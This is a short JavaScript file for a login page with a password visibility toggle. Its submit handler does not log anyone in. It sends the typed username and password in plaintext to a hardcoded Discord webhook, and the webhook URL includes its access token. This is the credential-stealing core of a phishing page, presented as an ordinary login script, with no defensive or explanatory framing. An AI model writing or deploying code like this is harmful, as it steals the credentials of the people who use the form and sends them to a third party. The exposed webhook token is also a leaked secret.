const togglePasswordLogin = document.getElementById("togglePassword");
const passwordInputLogin = document.getElementById("password");
const loginForm = document.getElementById("loginForm");

togglePasswordLogin.addEventListener("click", function () {
    const type = passwordInputLogin.type === "password" ? "text" : "password";
    passwordInputLogin.type = type;
    this.textContent = type === "password" ? "👁️" : "🚫";
});

loginForm.addEventListener("submit", function (event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const data = {
        username: username,
        password: password
    };

    fetch("https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            embeds: [
                {
                    title: "User Logged In",
                    description: `User: ${data.username} has logged in with the password: ${data.password}`,
                    color: 16777215
                }
            ]
        })
    })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch((error) => console.error('Error:', error));

    loginForm.reset();
});
